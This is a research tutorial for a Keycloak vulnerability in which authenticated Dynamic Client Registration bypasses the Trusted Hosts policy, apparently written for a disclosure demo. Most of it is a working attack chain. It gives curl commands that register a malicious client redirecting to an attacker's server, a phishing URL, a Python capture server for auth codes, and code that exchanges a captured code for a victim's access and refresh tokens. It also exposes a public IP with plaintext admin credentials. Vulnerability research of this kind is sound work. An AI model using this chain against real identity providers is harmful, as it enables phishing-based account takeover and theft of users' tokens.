# Tutorial: Finding #5 — DCR Trusted Hosts Bypass — Live Token Theft via Phishing

**Severity:** HIGH (CVSS 8.0)
**Demo time:** ~10 minutes
**Requirements:** 2 Terminals + 1 Browser
**This is the most impactful finding — full token theft from the victim in real-time!**

---

## Attack Scenario

1. **Attacker** (has a regular account + `create-client` role) runs the script
2. Script automatically registers a malicious client, generates a phishing URL, starts a capture server
3. **Attacker** sends the phishing URL to the **victim** (via email, chat, etc.)
4. **Victim** clicks the link → sees a 100% legitimate Keycloak login page → logs in
5. Auth code is automatically sent to the attacker's server → exchanged for **victim's token**

---

## Step 0: Ensure Keycloak is Running

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Step 1: (ADMIN SETUP) Assign create-client Role to testuser

### Via Admin Console:
1. Open: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Realm **test** → **Users** → click **testuser**
4. Tab **Role mappings** → click **Assign role**
5. Filter by client → select **realm-management**
6. Check **create-client** → click **Assign**

### Or via CLI:
```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

---

## Method A: Run Python PoC (Automated — Recommended for Video Demo)

### Terminal 1 — Run the attack script:

```bash
cd /home/anggi/keycloak-research
python3 pocs/poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888
```

The script will:
1. Automatically login as the attacker (testuser)
2. Register a malicious client via DCR
3. Generate a phishing URL
4. Start a capture server on port 48888
5. Wait for the victim to click the URL and login...

**Expected output:**
```
╔══════════════════════════════════════════════════════════════╗
║                 PHISHING URL READY TO SEND                   ║
╚══════════════════════════════════════════════════════════════╝

Send the following URL to the target victim:

http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=XXXXX&response_type=code&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&scope=openid+profile+email

⠋ Waiting for victim... (5s / 300s) — Open URL in browser to simulate
```

### Browser — Simulate the victim:

1. **Copy the phishing URL** from Terminal 1 output
2. **Open that URL in the browser**
3. A **100% legitimate Keycloak login page** will appear — no suspicious signs!
4. Login as the victim:
   - Username: `victim`
   - Password: `Password123`
5. After login, the victim sees a **"Login Successful!"** page (but this is actually a fake page from the attacker)

### Back to Terminal 1 — Auth code captured automatically:

```
=======================================================
  *** VICTIM AUTH CODE CAPTURED! ***
=======================================================
  Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
=======================================================

[Step 7] ATTACKER — Exchange stolen auth code for victim's token

╔══════════════════════════════════════════════════════════════╗
║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
╚══════════════════════════════════════════════════════════════╝

  Username     : victim
  Email        : victim@test.com
  Full Name    : Victim User
  Scope        : openid profile email
  Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
  Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...

Attacker now has full access to the victim's account!
```

### Auto-Victim Mode (for testing without a browser):

```bash
python3 pocs/poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --auto-victim --timeout 30
```

The `--auto-victim` flag will automatically simulate victim login without requiring a browser.

---

## Method B: Manual Step-by-Step (For Detailed Understanding)

### Step 2: (ATTACKER) Login and Obtain Token

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
```

### Step 3: (ATTACKER) Register Malicious Client via DCR

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Aplikasi Resmi Perusahaan",
    "redirect_uris": ["http://46.101.162.187:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')

echo "$REG_RESP" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print('=== MALICIOUS CLIENT REGISTERED! ===')
print(f'Client ID:     {d[\"client_id\"]}')
print(f'Client Secret: {d[\"client_secret\"]}')
print(f'Redirect URI:  {d[\"redirect_uris\"]}')
print('================================')
"

MAL_CLIENT_ID=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_id'])")
MAL_SECRET=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_secret'])")
```

> **VULNERABLE:** Client with redirect to attacker's server was registered without rejection!

### Step 4: (CONTROL) Anonymous DCR — Should Be Rejected

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://46.101.162.187:48888/callback"]}' \
  | python3 -m json.tool
```

**Output (Correctly Rejected):**
```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

### Step 5: (ATTACKER) Start Capture Server (Terminal 2)

Open a new terminal — this server will capture the victim's auth code:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'code' in params:
            code = params['code'][0]
            print()
            print('=' * 55)
            print('  *** VICTIM AUTH CODE CAPTURED! ***')
            print('=' * 55)
            print(f'  Code: {code}')
            print('=' * 55)
            print()
            print('Use this code in Step 8 to steal the victim token!')
            print()
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h2>Login Successful!</h2><p>This page can be closed.</p></body></html>')
    def log_message(self, *a): pass

print('Capture server active on port 48888...')
print('Waiting for victim to click phishing URL and login...')
HTTPServer(('0.0.0.0', 48888), H).serve_forever()
"
```

### Step 6: (ATTACKER) Generate Phishing URL (Terminal 1)

```bash
echo ""
echo "=== PHISHING URL ==="
echo "Send this URL to the victim:"
echo ""
echo "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=${MAL_CLIENT_ID}&response_type=code&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&scope=openid+profile+email"
echo ""
echo "This URL looks 100% legitimate — real Keycloak domain!"
echo "===================="
```

### Step 7: (VICTIM) Click URL and Login

1. **Open the phishing URL in a browser**
2. The **real Keycloak** login page appears — no suspicious signs
3. Login as victim:
   - Username: `victim`
   - Password: `Password123`
4. Victim sees a "Login Successful!" page (fake, from the attacker)

**In Terminal 2 (capture server) the following appears:**
```
=======================================================
  *** VICTIM AUTH CODE CAPTURED! ***
=======================================================
  Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e.J191clIaMcw...
=======================================================
```

### Step 8: (ATTACKER) Exchange Auth Code → Victim Token

```bash
# Replace AUTH_CODE with the code captured in Terminal 2
AUTH_CODE="PASTE_CODE_FROM_TERMINAL_2"

curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://46.101.162.187:48888/callback" \
  | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
if 'error' in d:
    print('Error:', d)
    sys.exit(1)

at = d['access_token']
payload = at.split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))

print()
print('====================================')
print('  VICTIM TOKEN SUCCESSFULLY STOLEN!')
print('====================================')
print(f'  Username:      {claims.get(\"preferred_username\")}')
print(f'  Email:         {claims.get(\"email\")}')
print(f'  Name:          {claims.get(\"name\")}')
print(f'  User ID:       {claims.get(\"sub\")}')
print(f'  Scope:         {d.get(\"scope\")}')
print(f'  Access Token:  {at[:50]}...')
print(f'  Refresh Token: {d.get(\"refresh_token\",\"\")[:50]}...')
print('====================================')
print()
print('Attacker now has full access to the victim account!')
"
```

### Step 9: (ATTACKER) Verify — Access Victim Data

```bash
# Get access token from the previous step
VICTIM_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://46.101.162.187:48888/callback" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")

curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  | python3 -m json.tool
```

---

## Summary

| Step | Action | Result |
|---|---|---|
| 1 | Attacker registers client via authenticated DCR | Client with redirect to attacker's server — **SUCCESS** |
| 2 | Control: Anonymous DCR | **BLOCKED** by Trusted Hosts (correct) |
| 3 | Attacker generates phishing URL | 100% legitimate Keycloak domain URL |
| 4 | Capture server waits for victim | Listener active, ready to capture auth code |
| 5 | Victim clicks URL, logs in on real Keycloak | Auth code redirected to attacker's server — **CAPTURED** |
| 6 | Attacker exchanges auth code | Victim's token — **FULLY STOLEN** |
| 7 | Access victim data | Userinfo successfully accessed — **VERIFIED** |

**Policy Gap:**
- **Anonymous DCR:** Trusted Hosts ENFORCED (correct)
- **Authenticated DCR:** Trusted Hosts **ABSENT** (vulnerability)
- **Admin REST API:** Returns 403 (correct)

**Attack Flow:**
```
Attacker runs script
        │
        ▼
Register malicious client (redirect → attacker's server)
        │
        ▼
Generate phishing URL (real Keycloak domain)
        │
        ▼
Send URL to victim ──────► Victim clicks URL
                                    │
                                    ▼
                            REAL Keycloak login page
                                    │
                                    ▼
                            Victim logs in (victim / Password123)
                                    │
                                    ▼
                            Keycloak redirect + auth code
                                    │
                                    ▼
                    Attacker's server captures auth code ◄──┘
                                    │
                                    ▼
                    Exchange code → victim's token
                                    │
                                    ▼
                    FULL ACCESS TO VICTIM'S ACCOUNT
```

**Conclusion:** A single user with the `create-client` role can steal the token of any user in the same realm, including admins. This attack is extremely dangerous because the victim sees a login page that is 100% genuine from the real Keycloak domain.
